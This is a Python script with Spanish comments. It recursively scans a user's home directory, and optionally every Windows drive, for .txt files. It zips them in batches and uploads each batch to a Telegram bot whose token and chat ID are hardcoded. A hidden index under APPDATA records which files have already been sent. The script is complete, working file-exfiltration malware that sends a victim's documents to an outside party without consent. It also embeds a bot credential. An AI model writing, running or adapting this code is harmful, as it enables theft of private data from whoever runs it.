import os
import sys
import json
import hashlib
import zipfile
from pathlib import Path
from typing import Iterable, List, Tuple
import requests
import time

# ===========================
#  CREDENCIALES DEL BOT
# ===========================
BOT_TOKEN = "6137879346:AAFbSSJmWCDFjgMqm7xxr7jjJmRh7z137GI"
CHAT_ID = "6623014135"

# ===========================
#  OPCIONES
# ===========================
TELEGRAM_LIMIT_BYTES = 50 * 1024 * 1024          # Límite duro Telegram
BATCH_RAW_SOFT_LIMIT = 40 * 1024 * 1024          # “Colchón” por lote (suma sin comprimir)
MAX_SINGLE_TXT_BYTES = 45 * 1024 * 1024          # Máx tamaño por .txt individual
INCLUDE_EXTS = {".txt"}                           # Extensiones incluidas
USE_CONTENT_HASH = True                           # Hash de contenido para dedupe
SEARCH_WHOLE_DRIVES = False                       # Si True (Windows) recorre C:\, D:\, ...

# ===========================
#  RUTAS Y UTILIDADES
# ===========================
def get_appdata_dir() -> Path:
    appdata = os.getenv("APPDATA")
    if appdata:
        base = Path(appdata) / "TelegramTxtSender"
    else:
        base = Path.home() / ".telegram_txt_sender"
    base.mkdir(parents=True, exist_ok=True)
    return base

APP_DIR = get_appdata_dir()
INDEX_PATH = APP_DIR / "sent_index.jsonl"
LOG_PATH = APP_DIR / "last_run.log"
ARCHIVES_DIR = APP_DIR / "archives"
ARCHIVES_DIR.mkdir(parents=True, exist_ok=True)

def log(msg: str):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    try:
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line)

def iter_user_profile_dirs():
    home = Path.home()

    excludes = set()
    excludes.add(str(APP_DIR.resolve()).lower())

    appdata_env = os.getenv("APPDATA")
    if appdata_env:
        excludes.add(str(Path(appdata_env).resolve()).lower())
        local_appdata = os.getenv("LOCALAPPDATA")
        if local_appdata:
            excludes.add(str(Path(local_appdata).resolve()).lower())

    common_excludes = [
        ".cache", ".config", ".local", ".venv", "node_modules",
        "venv", "env", "__pycache__", ".git"
    ]

    def is_excluded(p: Path) -> bool:
        try:
            p_str = str(p.resolve()).lower()
        except Exception:
            p_str = str(p).lower()
        if any(p_str.startswith(ex) for ex in excludes):
            return True
        parts = [part.lower() for part in p.parts]
        return any(name in parts for name in common_excludes)

    for root, dirs, files in os.walk(home, topdown=True):
        root_path = Path(root)
        dirs[:] = [d for d in dirs if not is_excluded(root_path / d)]
        yield root_path, files

def iter_all_drives():
    import string
    drives = []
    if os.name == "nt":
        for letter in string.ascii_uppercase:
            d = Path(f"{letter}:/")
            if d.exists():
                drives.append(d)

    excludes_roots = {"windows", "program files", "program files (x86)", "programdata", "$recycle.bin", "system volume information"}

    for drive in drives:
        for root, dirs, files in os.walk(drive, topdown=True):
            root_path = Path(root)
            dirs[:] = [d for d in dirs if d.lower() not in excludes_roots]
            yield root_path, files

def file_fingerprint(path: Path) -> str:
    if USE_CONTENT_HASH:
        try:
            h = hashlib.sha256()
            with path.open("rb") as f:
                for chunk in iter(lambda: f.read(1024 * 1024), b""):
                    h.update(chunk)
            return "sha256:" + h.hexdigest()
        except Exception:
            pass
    try:
        stat = path.stat()
        raw = f"{str(path.resolve())}|{stat.st_size}|{int(stat.st_mtime)}".encode("utf-8", errors="ignore")
        return "fast:" + hashlib.sha1(raw).hexdigest()
    except Exception:
        return "path:" + hashlib.md5(str(path.resolve()).encode("utf-8", errors="ignore")).hexdigest()

def load_sent_index() -> set:
    seen = set()
    if INDEX_PATH.exists():
        with INDEX_PATH.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                    h = obj.get("hash")
                    if h:
                        seen.add(h)
                except Exception:
                    continue
    return seen

def append_to_index(file_hash: str, path: Path):
    try:
        with INDEX_PATH.open("a", encoding="utf-8") as f:
            f.write(json.dumps({"hash": file_hash, "path": str(path)}) + "\n")
    except Exception:
        pass

def should_skip(path: Path) -> bool:
    try:
        if not path.is_file():
            return True
        if path.suffix.lower() not in INCLUDE_EXTS:
            return True
        size = path.stat().st_size
        if size <= 0 or size > MAX_SINGLE_TXT_BYTES:
            return True
        if APP_DIR in path.parents:
            return True
    except Exception:
        return True
    return False

def scan_sources() -> Iterable[Path]:
    # 1) Home
    for root_path, files in iter_user_profile_dirs():
        for name in files:
            p = root_path / name
            if not should_skip(p):
                yield p
    # 2) (opcional) todas las unidades (Windows)
    if SEARCH_WHOLE_DRIVES and os.name == "nt":
        for root_path, files in iter_all_drives():
            for name in files:
                p = root_path / name
                if not should_skip(p):
                    yield p

def batch_by_size(paths_and_sizes: List[Tuple[Path, int]], soft_limit: int) -> List[List[Tuple[Path, int]]]:
    batches = []
    current = []
    cur_sum = 0
    for p, sz in paths_and_sizes:
        if sz > soft_limit and not current:
            batches.append([(p, sz)])
            continue
        if cur_sum + sz > soft_limit and current:
            batches.append(current)
            current = [(p, sz)]
            cur_sum = sz
        else:
            current.append((p, sz))
            cur_sum += sz
    if current:
        batches.append(current)
    return batches

def safe_arcname(p: Path) -> str:
    """
    Devuelve un nombre único y legible dentro del ZIP.
    - Preferimos ruta relativa al home del usuario.
    - Normalizamos separadores a '/'.
    """
    home = Path.home()
    try:
        rel = p.relative_to(home)
        arc = rel.as_posix()
    except Exception:
        # Si no es relativo al home (p.ej. otra unidad), incluye letra de unidad
        if os.name == "nt":
            drive = p.drive.replace(":", "")
            arc = f"{drive}/{p.as_posix()[len(p.anchor):]}"
        else:
            arc = p.as_posix()
    # Evita nombres vacíos o que terminen en '/'
    arc = arc.strip("/\\")
    if not arc:
        arc = p.name
    return arc

def clamp_zip_datetime(ts: float) -> tuple:
    """
    zipfile no acepta fechas < 1980. Ajustamos si hace falta.
    Devuelve (Y, M, D, h, m, s) válido.
    """
    try:
        lt = time.localtime(ts)
        year = max(1980, lt.tm_year)
        return (year, lt.tm_mon, lt.tm_mday, lt.tm_hour, lt.tm_min, lt.tm_sec)
    except Exception:
        return (1980, 1, 1, 0, 0, 0)

def build_zip(batch: List[Tuple[Path, int]], out_dir: Path, idx: int) -> Path:
    zip_path = out_dir / f"text_batch_{idx:03d}.zip"
    manifest_lines = []
    used_names = set()

    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for p, _sz in batch:
            # Calcula nombre seguro dentro del zip
            base_arc = safe_arcname(p)
            arcname = base_arc
            # Evita duplicados: si ya existe, añade sufijo (2), (3)...
            if arcname in used_names:
                stem = Path(base_arc).stem
                suffix = Path(base_arc).suffix
                n = 2
                while True:
                    candidate = f"{stem} ({n}){suffix}" if suffix else f"{stem} ({n})"
                    # Mantén la carpeta si la había
                    parent = str(Path(base_arc).parent).replace("\\", "/").strip("/.")
                    arcname = f"{parent}/{candidate}" if parent not in ("", ".") else candidate
                    if arcname not in used_names:
                        break
                    n += 1
            used_names.add(arcname)

            # Lee bytes y escribe con ZipInfo custom para clamplear fecha
            try:
                data = p.read_bytes()
            except Exception as e:
                log(f"⚠️ No se pudo leer {p}: {e}")
                continue

            try:
                zinfo = zipfile.ZipInfo(filename=arcname)
                try:
                    ts = p.stat().st_mtime
                except Exception:
                    ts = time.time()
                zinfo.date_time = clamp_zip_datetime(ts)
                zinfo.compress_type = zipfile.ZIP_DEFLATED
                zf.writestr(zinfo, data)
                manifest_lines.append(str(p))
            except Exception as e:
                log(f"⚠️ No se pudo añadir {p} al zip: {e}")

        # Manifiesto
        try:
            zf.writestr("MANIFEST.txt", "\n".join(manifest_lines))
        except Exception:
            pass

    return zip_path

def enviar_documento(bot_token: str, chat_id: str, ruta: Path, caption: str = "") -> dict:
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with ruta.open("rb") as f:
        files = {"document": (ruta.name, f)}
        data = {"chat_id": chat_id, "caption": caption or ruta.name}
        r = requests.post(url, data=data, files=files, timeout=120)

    if not r.ok:
        try:
            log(f"Detalle Telegram: {r.json()}")
        except Exception:
            log(f"Detalle Telegram (raw): {r.text}")
        r.raise_for_status()
    return r.json()

def main():
    if not BOT_TOKEN or not CHAT_ID:
        log("Faltan BOT_TOKEN o CHAT_ID.")
        sys.exit(1)

    seen = load_sent_index()

    # 1) Recolecta candidatos NUEVOS
    candidates: List[Tuple[Path, str, int]] = []
    for p in scan_sources():
        try:
            h = file_fingerprint(p)
            if h in seen:
                continue
            sz = p.stat().st_size
            candidates.append((p, h, sz))
        except Exception:
            continue

    if not candidates:
        log("No hay archivos .txt nuevos para enviar.")
        return

    # 2) Prepara lotes por tamaño sin comprimir
    candidates.sort(key=lambda x: x[2])  # por tamaño ascendente
    paths_and_sizes = [(p, sz) for p, _h, sz in candidates]
    batches = batch_by_size(paths_and_sizes, BATCH_RAW_SOFT_LIMIT)

    log(f"Se crearán {len(batches)} zip(s) de hasta ~{BATCH_RAW_SOFT_LIMIT // (1024*1024)} MB (raw).")

    # 3) Construye zips
    zips: List[Tuple[Path, List[Tuple[Path, str]]]] = []
    idx = 1
    for batch in batches:
        zip_path = build_zip(batch, ARCHIVES_DIR, idx)
        # Empareja cada Path con su hash correspondiente
        mapping = {p: h for (p, h, _sz) in candidates}
        zips.append((zip_path, [(p, mapping[p]) for p, _sz in batch]))
        idx += 1

    # 4) Envía cada zip y, si ok, marca sus archivos como enviados
    sent_files = 0
    for i, (zip_path, batch_items) in enumerate(zips, start=1):
        try:
            if zip_path.stat().st_size > TELEGRAM_LIMIT_BYTES:
                log(f"⚠️ Zip {zip_path.name} pesa {zip_path.stat().st_size} bytes (>50MB). Ajusta BATCH_RAW_SOFT_LIMIT.")
                continue
            caption = f"TXT batch {i}/{len(zips)} ({zip_path.name})"
            enviar_documento(BOT_TOKEN, CHAT_ID, zip_path, caption=caption)
            log(f"✅ Enviado zip: {zip_path.name}")
            for p, h in batch_items:
                append_to_index(h, p)
                sent_files += 1
        except Exception as e:
            log(f"❌ Error enviando zip {zip_path.name}: {e}")

    log(f"Resumen: {sent_files} archivo(s) contenidos enviados dentro de {len(zips)} zip(s).")

# === funciones auxiliares que faltaban en el recorte ===
def scan_sources() -> Iterable[Path]:
    # 1) Home
    for root_path, files in iter_user_profile_dirs():
        for name in files:
            p = root_path / name
            if not should_skip(p):
                yield p
    # 2) (opcional) todas las unidades (Windows)
    if SEARCH_WHOLE_DRIVES and os.name == "nt":
        for root_path, files in iter_all_drives():
            for name in files:
                p = root_path / name
                if not should_skip(p):
                    yield p

if __name__ == "__main__":
    main()
